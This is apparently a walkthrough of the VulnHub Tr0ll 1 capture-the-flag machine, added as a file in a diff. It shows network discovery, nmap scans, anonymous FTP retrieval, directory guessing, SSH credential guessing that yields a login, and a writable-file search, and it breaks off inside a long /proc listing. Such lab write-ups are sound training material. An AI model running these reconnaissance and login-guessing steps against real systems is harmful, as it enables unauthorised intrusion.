@@ -1,0 +1,1445 @@
+URL : https://www.vulnhub.com/entry/tr0ll-1,100/
+
+1.) Identify the IP address of the victim machine
+root@kali:~# netdiscover
+ Currently scanning: 192.168.31.0/16   |   Screen View: Unique Hosts
+
+ 6 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 360
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor
+ -----------------------------------------------------------------------------
+ 192.168.0.1     c4:a8:1d:2e:2d:1c    01    060   Unknown vendor
+ 192.168.0.4     08:d4:0c:22:5c:ea    01    060   Unknown vendor
+ 192.168.0.7     00:0c:29:39:e9:62    01    060   VMware, Inc.
+ 192.168.0.5     3c:91:57:12:05:73    01    060   Unknown vendor
+ 192.168.0.2     dc:3e:f8:eb:e8:f4    01    060   Unknown vendor
+ 192.168.0.3     bc:77:37:17:0e:03    01    060   Unknown vendor
+ 
+ 2.) Run an nmap syn scan to identify open ports and running services
+ root@kali:~# nmap -p 1-65535 -sV -sS -A -T4 192.168.0.7
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-06-19 11:20 PDT
+Nmap scan report for 192.168.0.7
+Host is up (0.00062s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.2
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
+22/tcp open  ssh     (protocol 2.0)
+| ssh-hostkey:
+|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
+|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
+|_  256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry
+|_/secret
+|_http-title: Site doesn't have a title (text/html).
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port22-TCP:V=6.47%I=7%D=6/19%Time=55845D5F%P=i686-pc-linux-gnu%r(NULL,2
+SF:9,"SSH-2\.0-OpenSSH_6\.6\.1p1\x20Ubuntu-2ubuntu2\r\n");
+MAC Address: 00:0C:29:39:E9:62 (VMware)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.11 - 3.14
+Network Distance: 1 hop
+Service Info: OS: Unix
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.62 ms 192.168.0.7
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
+
+3.) Anonymous login is enabled on the Tr0ll machine
+root@kali:~# ftp 192.168.0.7
+Connected to 192.168.0.7.
+220 (vsFTPd 3.0.2)
+Name (192.168.0.7:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
+226 Directory send OK.
+ftp> get lol.pcap
+local: lol.pcap remote: lol.pcap
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
+226 Transfer complete.
+8068 bytes received in 0.00 secs (2986.7 kB/s)
+ftp> exit
+221 Goodbye.
+
+4.) Open lol.pcap in wireshark
+Read packet number 40 in lol.pcap
+Protocol is FTP-DATA
+So apply a filter in Wireshark as FTP-DATA 
+Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P
+
+Sucks, you were so close... gotta TRY HARDER!
+
+5.) Try to login into Tr0ll machine as root with password as sup3rs3cr3tdirlol. But the password doesn't work. 
+root@kali:~# ssh 192.168.0.7
+The authenticity of host '192.168.0.7 (192.168.0.7)' can't be established.
+ECDSA key fingerprint is 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.0.7' (ECDSA) to the list of known hosts.
+root@192.168.0.7's password:
+Permission denied, please try again.
+root@192.168.0.7's password:
+Try password as sup3rs3cr3tdirlol
+
+6.) Perform HTTP enumeration using nmap
+root@kali:~# nmap --script=http-enum -p80 -n 192.168.0.7
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-06-19 11:32 PDT
+Nmap scan report for 192.168.0.7
+Host is up (0.00024s latency).
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum:
+|   /robots.txt: Robots file
+|_  /secret/: Potentially interesting folder
+MAC Address: 00:0C:29:39:E9:62 (VMware)
+
+http://192.168.0.7/secret/
+
+7.) Try "sup3rs3cr3tdirlol" as a directory
+http://192.168.0.7/sup3rs3cr3tdirlol/
+
+Directory contains a file roflmao. Run strings on the file roflmao
+
+root@kali:~# strings roflmao
+/lib/ld-linux.so.2
+libc.so.6
+_IO_stdin_used
+printf
+__libc_start_main
+__gmon_start__
+GLIBC_2.0
+PTRh
+[^_]
+Find address 0x0856BF to proceed
+;*2$"
+
+8.) Try "0x0856BF" as a directory
+http://192.168.0.7/0x0856BF/
+It contains 2 directories 
+1.)good_luck
+2.)this_folder_contains_the_password
+
+http://192.168.0.7/0x0856BF/good_luck/which_one_lol.txt
+maleus
+ps-aux
+felux
+Eagle11
+genphlux < -- Definitely not this one
+usmc8892
+blawrg
+wytshadow
+vis1t0r
+overflow
+
+http://192.168.0.7/0x0856BF/this_folder_contains_the_password/Pass.txt
+Good_job_:)
+
+9.) Try to log into the Tr0ll machine using the usernames from "which_one_lol.txt" and password from "Pass.txt". But nothing works.
+After several attempts SSH starts refusing connections from our machine.
+Chainging our machines IP address (attacker) lets us reconnect with the Tr0ll machine.
+This happens because of the following reasons -> iptables, fail2ban / DenyHosts
+
+10.) Connect to Tr0ll (via SSH) using the below credentails
+Username : overflow
+Password : Pass.txt
+
+root@kali:~# ssh overflow@192.168.0.7
+overflow@192.168.0.7's password:
+Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Wed Aug 13 01:14:09 2014 from 10.0.0.12
+Could not chdir to home directory /home/overflow: No such file or directory
+$ id
+uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
+
+Broadcast Message from root@trol
+        (somewhere) at 23:40 ...
+
+TIMES UP LOL!
+
+Connection to 192.168.0.7 closed by remote host.
+Connection to 192.168.0.7 closed.
+
+10.) Search for writable files on the Tr0ll machine
+root@kali:~# ssh overflow@192.168.0.7
+overflow@192.168.0.7's password:
+Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Wed Aug 13 01:14:09 2014 from 10.0.0.12
+Could not chdir to home directory /home/overflow: No such file or directory
+$ bash
+overflow@troll:/$ find / -writable 2>/dev/null
+/tmp
+/run/dbus/system_bus_socket
+/run/user/1002
+/run/shm
+/run/lock
+/srv/ftp/lol.pcap
+/var/tmp
+/var/tmp/linux-local-enum.sh
+/var/tmp/cleaner.py.swp
+/var/lock
+/var/www/html/sup3rs3cr3tdirlol/roflmao
+/var/log/cronlog
+/sys/fs/cgroup/systemd/user/1002.user/7.session
+/sys/fs/cgroup/systemd/user/1002.user/7.session/tasks
+/sys/fs/cgroup/systemd/user/1002.user/7.session/cgroup.event_control
+/sys/fs/cgroup/systemd/user/1002.user/7.session/cgroup.procs
+/sys/fs/cgroup/systemd/user/1002.user/cgroup.event_control
+/sys/fs/cgroup/systemd/user/cgroup.event_control
+/sys/fs/cgroup/systemd/cgroup.event_control
+/sys/kernel/security/apparmor/.null
+/sys/kernel/security/apparmor/.access
+/proc/sys/kernel/ns_last_pid
+/proc/1/task/1/attr/current
+/proc/1/task/1/attr/exec
+/proc/1/task/1/attr/fscreate
+/proc/1/task/1/attr/keycreate
+/proc/1/task/1/attr/sockcreate
+/proc/1/attr/current
+/proc/1/attr/exec
+/proc/1/attr/fscreate
+/proc/1/attr/keycreate
+/proc/1/attr/sockcreate
+/proc/2/task/2/attr/current
+/proc/2/task/2/attr/exec
+/proc/2/task/2/attr/fscreate
+/proc/2/task/2/attr/keycreate
+/proc/2/task/2/attr/sockcreate
+/proc/2/attr/current
+/proc/2/attr/exec
+/proc/2/attr/fscreate
+/proc/2/attr/keycreate
+/proc/2/attr/sockcreate
+/proc/3/task/3/attr/current
+/proc/3/task/3/attr/exec
+/proc/3/task/3/attr/fscreate
+/proc/3/task/3/attr/keycreate
+/proc/3/task/3/attr/sockcreate
+/proc/3/attr/current
+/proc/3/attr/exec
+/proc/3/attr/fscreate
+/proc/3/attr/keycreate
+/proc/3/attr/sockcreate
+/proc/5/task/5/attr/current
+/proc/5/task/5/attr/exec
+/proc/5/task/5/attr/fscreate
+/proc/5/task/5/attr/keycreate
+/proc/5/task/5/attr/sockcreate
+/proc/5/attr/current
+/proc/5/attr/exec
+/proc/5/attr/fscreate
+/proc/5/attr/keycreate
+/proc/5/attr/sockcreate
+/proc/7/task/7/attr/current
+/proc/7/task/7/attr/exec
+/proc/7/task/7/attr/fscreate
+/proc/7/task/7/attr/keycreate
+/proc/7/task/7/attr/sockcreate
+/proc/7/attr/current
+/proc/7/attr/exec
+/proc/7/attr/fscreate
+/proc/7/attr/keycreate
+/proc/7/attr/sockcreate
+/proc/8/task/8/attr/current
+/proc/8/task/8/attr/exec
+/proc/8/task/8/attr/fscreate
+/proc/8/task/8/attr/keycreate
+/proc/8/task/8/attr/sockcreate
+/proc/8/attr/current
+/proc/8/attr/exec
+/proc/8/attr/fscreate
+/proc/8/attr/keycreate
+/proc/8/attr/sockcreate
+/proc/9/task/9/attr/current
+/proc/9/task/9/attr/exec
+/proc/9/task/9/attr/fscreate
+/proc/9/task/9/attr/keycreate
+/proc/9/task/9/attr/sockcreate
+/proc/9/attr/current
+/proc/9/attr/exec
+/proc/9/attr/fscreate
+/proc/9/attr/keycreate
+/proc/9/attr/sockcreate
+/proc/10/task/10/attr/current
+/proc/10/task/10/attr/exec
+/proc/10/task/10/attr/fscreate
+/proc/10/task/10/attr/keycreate
+/proc/10/task/10/attr/sockcreate
+/proc/10/attr/current
+/proc/10/attr/exec
+/proc/10/attr/fscreate
+/proc/10/attr/keycreate
+/proc/10/attr/sockcreate
+/proc/11/task/11/attr/current
+/proc/11/task/11/attr/exec
+/proc/11/task/11/attr/fscreate
+/proc/11/task/11/attr/keycreate
+/proc/11/task/11/attr/sockcreate
+/proc/11/attr/current
+/proc/11/attr/exec
+/proc/11/attr/fscreate
+/proc/11/attr/keycreate
+/proc/11/attr/sockcreate
+/proc/12/task/12/attr/current
+/proc/12/task/12/attr/exec
+/proc/12/task/12/attr/fscreate
+/proc/12/task/12/attr/keycreate
+/proc/12/task/12/attr/sockcreate
+/proc/12/attr/current
+/proc/12/attr/exec
+/proc/12/attr/fscreate
+/proc/12/attr/keycreate
+/proc/12/attr/sockcreate
+/proc/13/task/13/attr/current
+/proc/13/task/13/attr/exec
+/proc/13/task/13/attr/fscreate
+/proc/13/task/13/attr/keycreate
+/proc/13/task/13/attr/sockcreate
+/proc/13/attr/current
+/proc/13/attr/exec
+/proc/13/attr/fscreate
+/proc/13/attr/keycreate
+/proc/13/attr/sockcreate
+/proc/14/task/14/attr/current
+/proc/14/task/14/attr/exec
+/proc/14/task/14/attr/fscreate
+/proc/14/task/14/attr/keycreate
+/proc/14/task/14/attr/sockcreate
+/proc/14/attr/current
+/proc/14/attr/exec
+/proc/14/attr/fscreate
+/proc/14/attr/keycreate
+/proc/14/attr/sockcreate
+/proc/15/task/15/attr/current
+/proc/15/task/15/attr/exec
+/proc/15/task/15/attr/fscreate
+/proc/15/task/15/attr/keycreate
+/proc/15/task/15/attr/sockcreate
+/proc/15/attr/current
+/proc/15/attr/exec
+/proc/15/attr/fscreate
+/proc/15/attr/keycreate
+/proc/15/attr/sockcreate
+/proc/16/task/16/attr/current
+/proc/16/task/16/attr/exec
+/proc/16/task/16/attr/fscreate
+/proc/16/task/16/attr/keycreate
+/proc/16/task/16/attr/sockcreate
+/proc/16/attr/current
+/proc/16/attr/exec
+/proc/16/attr/fscreate
+/proc/16/attr/keycreate
+/proc/16/attr/sockcreate
+/proc/17/task/17/attr/current
+/proc/17/task/17/attr/exec
+/proc/17/task/17/attr/fscreate
+/proc/17/task/17/attr/keycreate
+/proc/17/task/17/attr/sockcreate
+/proc/17/attr/current
+/proc/17/attr/exec
+/proc/17/attr/fscreate
+/proc/17/attr/keycreate
+/proc/17/attr/sockcreate
+/proc/18/task/18/attr/current
+/proc/18/task/18/attr/exec
+/proc/18/task/18/attr/fscreate
+/proc/18/task/18/attr/keycreate
+/proc/18/task/18/attr/sockcreate
+/proc/18/attr/current
+/proc/18/attr/exec
+/proc/18/attr/fscreate
+/proc/18/attr/keycreate
+/proc/18/attr/sockcreate
+/proc/19/task/19/attr/current
+/proc/19/task/19/attr/exec
+/proc/19/task/19/attr/fscreate
+/proc/19/task/19/attr/keycreate
+/proc/19/task/19/attr/sockcreate
+/proc/19/attr/current
+/proc/19/attr/exec
+/proc/19/attr/fscreate
+/proc/19/attr/keycreate
+/proc/19/attr/sockcreate
+/proc/20/task/20/attr/current
+/proc/20/task/20/attr/exec
+/proc/20/task/20/attr/fscreate
+/proc/20/task/20/attr/keycreate
+/proc/20/task/20/attr/sockcreate
+/proc/20/attr/current
+/proc/20/attr/exec
+/proc/20/attr/fscreate
+/proc/20/attr/keycreate
+/proc/20/attr/sockcreate
+/proc/21/task/21/attr/current
+/proc/21/task/21/attr/exec
+/proc/21/task/21/attr/fscreate
+/proc/21/task/21/attr/keycreate
+/proc/21/task/21/attr/sockcreate
+/proc/21/attr/current
+/proc/21/attr/exec
+/proc/21/attr/fscreate
+/proc/21/attr/keycreate
+/proc/21/attr/sockcreate
+/proc/22/task/22/attr/current
+/proc/22/task/22/attr/exec
+/proc/22/task/22/attr/fscreate
+/proc/22/task/22/attr/keycreate
+/proc/22/task/22/attr/sockcreate
+/proc/22/attr/current
+/proc/22/attr/exec
+/proc/22/attr/fscreate
+/proc/22/attr/keycreate
+/proc/22/attr/sockcreate
+/proc/23/task/23/attr/current
+/proc/23/task/23/attr/exec
+/proc/23/task/23/attr/fscreate
+/proc/23/task/23/attr/keycreate
+/proc/23/task/23/attr/sockcreate
+/proc/23/attr/current
+/proc/23/attr/exec
+/proc/23/attr/fscreate
+/proc/23/attr/keycreate
+/proc/23/attr/sockcreate
+/proc/25/task/25/attr/current
+/proc/25/task/25/attr/exec
+/proc/25/task/25/attr/fscreate
+/proc/25/task/25/attr/keycreate
+/proc/25/task/25/attr/sockcreate
+/proc/25/attr/current
+/proc/25/attr/exec
+/proc/25/attr/fscreate
+/proc/25/attr/keycreate
+/proc/25/attr/sockcreate
+/proc/26/task/26/attr/current
+/proc/26/task/26/attr/exec
+/proc/26/task/26/attr/fscreate
+/proc/26/task/26/attr/keycreate
+/proc/26/task/26/attr/sockcreate
+/proc/26/attr/current
+/proc/26/attr/exec
+/proc/26/attr/fscreate
+/proc/26/attr/keycreate
+/proc/26/attr/sockcreate
+/proc/27/task/27/attr/current
+/proc/27/task/27/attr/exec
+/proc/27/task/27/attr/fscreate
+/proc/27/task/27/attr/keycreate
+/proc/27/task/27/attr/sockcreate
+/proc/27/attr/current
+/proc/27/attr/exec
+/proc/27/attr/fscreate
+/proc/27/attr/keycreate
+/proc/27/attr/sockcreate
+/proc/28/task/28/attr/current
+/proc/28/task/28/attr/exec
+/proc/28/task/28/attr/fscreate
+/proc/28/task/28/attr/keycreate
+/proc/28/task/28/attr/sockcreate
+/proc/28/attr/current
+/proc/28/attr/exec
+/proc/28/attr/fscreate
+/proc/28/attr/keycreate
+/proc/28/attr/sockcreate
+/proc/29/task/29/attr/current
+/proc/29/task/29/attr/exec
+/proc/29/task/29/attr/fscreate
+/proc/29/task/29/attr/keycreate
+/proc/29/task/29/attr/sockcreate
+/proc/29/attr/current
+/proc/29/attr/exec
+/proc/29/attr/fscreate
+/proc/29/attr/keycreate
+/proc/29/attr/sockcreate
+/proc/30/task/30/attr/current
+/proc/30/task/30/attr/exec
+/proc/30/task/30/attr/fscreate
+/proc/30/task/30/attr/keycreate
+/proc/30/task/30/attr/sockcreate
+/proc/30/attr/current
+/proc/30/attr/exec
+/proc/30/attr/fscreate
+/proc/30/attr/keycreate
+/proc/30/attr/sockcreate
+/proc/42/task/42/attr/current
+/proc/42/task/42/attr/exec
+/proc/42/task/42/attr/fscreate
+/proc/42/task/42/attr/keycreate
+/proc/42/task/42/attr/sockcreate
+/proc/42/attr/current
+/proc/42/attr/exec
+/proc/42/attr/fscreate
+/proc/42/attr/keycreate
+/proc/42/attr/sockcreate
+/proc/44/task/44/attr/current
+/proc/44/task/44/attr/exec
+/proc/44/task/44/attr/fscreate
+/proc/44/task/44/attr/keycreate
+/proc/44/task/44/attr/sockcreate
+/proc/44/attr/current
+/proc/44/attr/exec
+/proc/44/attr/fscreate
+/proc/44/attr/keycreate
+/proc/44/attr/sockcreate
+/proc/45/task/45/attr/current
+/proc/45/task/45/attr/exec
+/proc/45/task/45/attr/fscreate
+/proc/45/task/45/attr/keycreate
+/proc/45/task/45/attr/sockcreate
+/proc/45/attr/current
+/proc/45/attr/exec
+/proc/45/attr/fscreate
+/proc/45/attr/keycreate
+/proc/45/attr/sockcreate
+/proc/60/task/60/attr/current
+/proc/60/task/60/attr/exec
+/proc/60/task/60/attr/fscreate
+/proc/60/task/60/attr/keycreate
+/proc/60/task/60/attr/sockcreate
+/proc/60/attr/current
+/proc/60/attr/exec
+/proc/60/attr/fscreate
+/proc/60/attr/keycreate
+/proc/60/attr/sockcreate
+/proc/68/task/68/attr/current
+/proc/68/task/68/attr/exec
+/proc/68/task/68/attr/fscreate
+/proc/68/task/68/attr/keycreate
+/proc/68/task/68/attr/sockcreate
+/proc/68/attr/current
+/proc/68/attr/exec
+/proc/68/attr/fscreate
+/proc/68/attr/keycreate
+/proc/68/attr/sockcreate
+/proc/69/task/69/attr/current
+/proc/69/task/69/attr/exec
+/proc/69/task/69/attr/fscreate
+/proc/69/task/69/attr/keycreate
+/proc/69/task/69/attr/sockcreate
+/proc/69/attr/current
+/proc/69/attr/exec
+/proc/69/attr/fscreate
+/proc/69/attr/keycreate
+/proc/69/attr/sockcreate
+/proc/107/task/107/attr/current
+/proc/107/task/107/attr/exec
+/proc/107/task/107/attr/fscreate
+/proc/107/task/107/attr/keycreate
+/proc/107/task/107/attr/sockcreate
+/proc/107/attr/current
+/proc/107/attr/exec
+/proc/107/attr/fscreate
+/proc/107/attr/keycreate
+/proc/107/attr/sockcreate
+/proc/110/task/110/attr/current
+/proc/110/task/110/attr/exec
+/proc/110/task/110/attr/fscreate
+/proc/110/task/110/attr/keycreate
+/proc/110/task/110/attr/sockcreate
+/proc/110/attr/current
+/proc/110/attr/exec
+/proc/110/attr/fscreate
+/proc/110/attr/keycreate
+/proc/110/attr/sockcreate
+/proc/119/task/119/attr/current
+/proc/119/task/119/attr/exec
+/proc/119/task/119/attr/fscreate
+/proc/119/task/119/attr/keycreate
+/proc/119/task/119/attr/sockcreate
+/proc/119/attr/current
+/proc/119/attr/exec
+/proc/119/attr/fscreate
+/proc/119/attr/keycreate
+/proc/119/attr/sockcreate
+/proc/124/task/124/attr/current
+/proc/124/task/124/attr/exec
+/proc/124/task/124/attr/fscreate
+/proc/124/task/124/attr/keycreate
+/proc/124/task/124/attr/sockcreate
+/proc/124/attr/current
+/proc/124/attr/exec
+/proc/124/attr/fscreate
+/proc/124/attr/keycreate
+/proc/124/attr/sockcreate
+/proc/137/task/137/attr/current
+/proc/137/task/137/attr/exec
+/proc/137/task/137/attr/fscreate
+/proc/137/task/137/attr/keycreate
+/proc/137/task/137/attr/sockcreate
+/proc/137/attr/current
+/proc/137/attr/exec
+/proc/137/attr/fscreate
+/proc/137/attr/keycreate
+/proc/137/attr/sockcreate
+/proc/138/task/138/attr/current
+/proc/138/task/138/attr/exec
+/proc/138/task/138/attr/fscreate
+/proc/138/task/138/attr/keycreate
+/proc/138/task/138/attr/sockcreate
+/proc/138/attr/current
+/proc/138/attr/exec
+/proc/138/attr/fscreate
+/proc/138/attr/keycreate
+/proc/138/attr/sockcreate
+/proc/268/task/268/attr/current
+/proc/268/task/268/attr/exec
+/proc/268/task/268/attr/fscreate
+/proc/268/task/268/attr/keycreate
+/proc/268/task/268/attr/sockcreate
+/proc/268/attr/current
+/proc/268/attr/exec
+/proc/268/attr/fscreate
+/proc/268/attr/keycreate
+/proc/268/attr/sockcreate
+/proc/273/task/273/attr/current
+/proc/273/task/273/attr/exec
+/proc/273/task/273/attr/fscreate
+/proc/273/task/273/attr/keycreate
+/proc/273/task/273/attr/sockcreate
+/proc/273/attr/current
+/proc/273/attr/exec
+/proc/273/attr/fscreate
+/proc/273/attr/keycreate
+/proc/273/attr/sockcreate
+/proc/340/task/340/attr/current
+/proc/340/task/340/attr/exec
+/proc/340/task/340/attr/fscreate
+/proc/340/task/340/attr/keycreate
+/proc/340/task/340/attr/sockcreate
+/proc/340/attr/current
+/proc/340/attr/exec
+/proc/340/attr/fscreate
+/proc/340/attr/keycreate
+/proc/340/attr/sockcreate
+/proc/380/task/380/attr/current
+/proc/380/task/380/attr/exec
+/proc/380/task/380/attr/fscreate
+/proc/380/task/380/attr/keycreate
+/proc/380/task/380/attr/sockcreate
+/proc/380/attr/current
+/proc/380/attr/exec
+/proc/380/attr/fscreate
+/proc/380/attr/keycreate
+/proc/380/attr/sockcreate
+/proc/382/task/382/attr/current
+/proc/382/task/382/attr/exec
+/proc/382/task/382/attr/fscreate
+/proc/382/task/382/attr/keycreate
+/proc/382/task/382/attr/sockcreate
+/proc/382/task/383/attr/current
+/proc/382/task/383/attr/exec
+/proc/382/task/383/attr/fscreate
+/proc/382/task/383/attr/keycreate
+/proc/382/task/383/attr/sockcreate
+/proc/382/task/384/attr/current
+/proc/382/task/384/attr/exec
+/proc/382/task/384/attr/fscreate
+/proc/382/task/384/attr/keycreate
+/proc/382/task/384/attr/sockcreate
+/proc/382/task/385/attr/current
+/proc/382/task/385/attr/exec
+/proc/382/task/385/attr/fscreate
+/proc/382/task/385/attr/keycreate
+/proc/382/task/385/attr/sockcreate
+/proc/382/attr/current
+/proc/382/attr/exec
+/proc/382/attr/fscreate
+/proc/382/attr/keycreate
+/proc/382/attr/sockcreate
+/proc/409/task/409/attr/current
+/proc/409/task/409/attr/exec
+/proc/409/task/409/attr/fscreate
+/proc/409/task/409/attr/keycreate
+/proc/409/task/409/attr/sockcreate
+/proc/409/attr/current
+/proc/409/attr/exec
+/proc/409/attr/fscreate
+/proc/409/attr/keycreate
+/proc/409/attr/sockcreate
+/proc/416/task/416/attr/current
+/proc/416/task/416/attr/exec
+/proc/416/task/416/attr/fscreate
+/proc/416/task/416/attr/keycreate
+/proc/416/task/416/attr/sockcreate
+/proc/416/attr/current
+/proc/416/attr/exec
+/proc/416/attr/fscreate
+/proc/416/attr/keycreate
+/proc/416/attr/sockcreate
+/proc/468/task/468/attr/current
+/proc/468/task/468/attr/exec
+/proc/468/task/468/attr/fscreate
+/proc/468/task/468/attr/keycreate
+/proc/468/task/468/attr/sockcreate
+/proc/468/attr/current
+/proc/468/attr/exec
+/proc/468/attr/fscreate
+/proc/468/attr/keycreate
+/proc/468/attr/sockcreate
+/proc/469/task/469/attr/current
+/proc/469/task/469/attr/exec
+/proc/469/task/469/attr/fscreate
+/proc/469/task/469/attr/keycreate
+/proc/469/task/469/attr/sockcreate
+/proc/469/attr/current
+/proc/469/attr/exec
+/proc/469/attr/fscreate
+/proc/469/attr/keycreate
+/proc/469/attr/sockcreate
+/proc/470/task/470/attr/current
+/proc/470/task/470/attr/exec
+/proc/470/task/470/attr/fscreate
+/proc/470/task/470/attr/keycreate
+/proc/470/task/470/attr/sockcreate
+/proc/470/attr/current
+/proc/470/attr/exec
+/proc/470/attr/fscreate
+/proc/470/attr/keycreate
+/proc/470/attr/sockcreate
+/proc/543/task/543/attr/current
+/proc/543/task/543/attr/exec
+/proc/543/task/543/attr/fscreate
+/proc/543/task/543/attr/keycreate
+/proc/543/task/543/attr/sockcreate
+/proc/543/attr/current
+/proc/543/attr/exec
+/proc/543/attr/fscreate
+/proc/543/attr/keycreate
+/proc/543/attr/sockcreate
+/proc/637/task/637/attr/current
+/proc/637/task/637/attr/exec
+/proc/637/task/637/attr/fscreate
+/proc/637/task/637/attr/keycreate
+/proc/637/task/637/attr/sockcreate
+/proc/637/attr/current
+/proc/637/attr/exec
+/proc/637/attr/fscreate
+/proc/637/attr/keycreate
+/proc/637/attr/sockcreate
+/proc/682/task/682/attr/current
+/proc/682/task/682/attr/exec
+/proc/682/task/682/attr/fscreate
+/proc/682/task/682/attr/keycreate
+/proc/682/task/682/attr/sockcreate
+/proc/682/attr/current
+/proc/682/attr/exec
+/proc/682/attr/fscreate
+/proc/682/attr/keycreate
+/proc/682/attr/sockcreate
+/proc/776/task/776/attr/current
+/proc/776/task/776/attr/exec
+/proc/776/task/776/attr/fscreate
+/proc/776/task/776/attr/keycreate
+/proc/776/task/776/attr/sockcreate
+/proc/776/attr/current
+/proc/776/attr/exec
+/proc/776/attr/fscreate
+/proc/776/attr/keycreate
+/proc/776/attr/sockcreate
+/proc/779/task/779/attr/current
+/proc/779/task/779/attr/exec
+/proc/779/task/779/attr/fscreate
+/proc/779/task/779/attr/keycreate
+/proc/779/task/779/attr/sockcreate
+/proc/779/attr/current
+/proc/779/attr/exec
+/proc/779/attr/fscreate
+/proc/779/attr/keycreate
+/proc/779/attr/sockcreate
+/proc/782/task/782/attr/current
+/proc/782/task/782/attr/exec
+/proc/782/task/782/attr/fscreate
+/proc/782/task/782/attr/keycreate
+/proc/782/task/782/attr/sockcreate
+/proc/782/attr/current
+/proc/782/attr/exec
+/proc/782/attr/fscreate
+/proc/782/attr/keycreate
+/proc/782/attr/sockcreate
+/proc/783/task/783/attr/current
+/proc/783/task/783/attr/exec
+/proc/783/task/783/attr/fscreate
+/proc/783/task/783/attr/keycreate
+/proc/783/task/783/attr/sockcreate
+/proc/783/attr/current
+/proc/783/attr/exec
+/proc/783/attr/fscreate
+/proc/783/attr/keycreate
+/proc/783/attr/sockcreate
+/proc/785/task/785/attr/current
+/proc/785/task/785/attr/exec
+/proc/785/task/785/attr/fscreate
+/proc/785/task/785/attr/keycreate
+/proc/785/task/785/attr/sockcreate
+/proc/785/attr/current
+/proc/785/attr/exec
+/proc/785/attr/fscreate
+/proc/785/attr/keycreate
+/proc/785/attr/sockcreate
+/proc/813/task/813/attr/current
+/proc/813/task/813/attr/exec
+/proc/813/task/813/attr/fscreate
+/proc/813/task/813/attr/keycreate
+/proc/813/task/813/attr/sockcreate
+/proc/813/attr/current
+/proc/813/attr/exec
+/proc/813/attr/fscreate
+/proc/813/attr/keycreate
+/proc/813/attr/sockcreate
+/proc/815/task/815/attr/current
+/proc/815/task/815/attr/exec
+/proc/815/task/815/attr/fscreate
+/proc/815/task/815/attr/keycreate
+/proc/815/task/815/attr/sockcreate
+/proc/815/attr/current
+/proc/815/attr/exec
+/proc/815/attr/fscreate
+/proc/815/attr/keycreate
+/proc/815/attr/sockcreate
+/proc/1134/task/1134/attr/current
+/proc/1134/task/1134/attr/exec
+/proc/1134/task/1134/attr/fscreate
+/proc/1134/task/1134/attr/keycreate
+/proc/1134/task/1134/attr/sockcreate
+/proc/1134/attr/current
+/proc/1134/attr/exec
+/proc/1134/attr/fscreate
+/proc/1134/attr/keycreate
+/proc/1134/attr/sockcreate
+/proc/1143/task/1143/attr/current
+/proc/1143/task/1143/attr/exec
+/proc/1143/task/1143/attr/fscreate
+/proc/1143/task/1143/attr/keycreate
+/proc/1143/task/1143/attr/sockcreate
+/proc/1143/task/1173/attr/current
+/proc/1143/task/1173/attr/exec
+/proc/1143/task/1173/attr/fscreate
+/proc/1143/task/1173/attr/keycreate
+/proc/1143/task/1173/attr/sockcreate
+/proc/1143/task/1174/attr/current
+/proc/1143/task/1174/attr/exec
+/proc/1143/task/1174/attr/fscreate
+/proc/1143/task/1174/attr/keycreate
+/proc/1143/task/1174/attr/sockcreate
+/proc/1143/task/1175/attr/current
+/proc/1143/task/1175/attr/exec
+/proc/1143/task/1175/attr/fscreate
+/proc/1143/task/1175/attr/keycreate
+/proc/1143/task/1175/attr/sockcreate
+/proc/1143/task/1176/attr/current
+/proc/1143/task/1176/attr/exec
+/proc/1143/task/1176/attr/fscreate
+/proc/1143/task/1176/attr/keycreate
+/proc/1143/task/1176/attr/sockcreate
+/proc/1143/task/1177/attr/current
